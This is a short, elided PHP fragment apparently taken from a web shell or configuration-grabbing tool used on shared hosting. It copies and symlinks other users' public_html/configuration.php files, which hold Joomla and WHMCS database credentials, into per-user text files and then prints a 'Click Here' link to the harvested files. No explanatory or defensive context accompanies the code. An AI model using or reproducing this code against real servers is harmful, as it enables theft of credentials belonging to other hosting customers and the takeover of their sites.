...
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'-WHMCS-JOOMLA.txt');
...
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'-WHMCS-JOOMLA.txt');
...
echo '<i><b><a href='.$folfig.'>Click Here</a></b></i></center>';
}
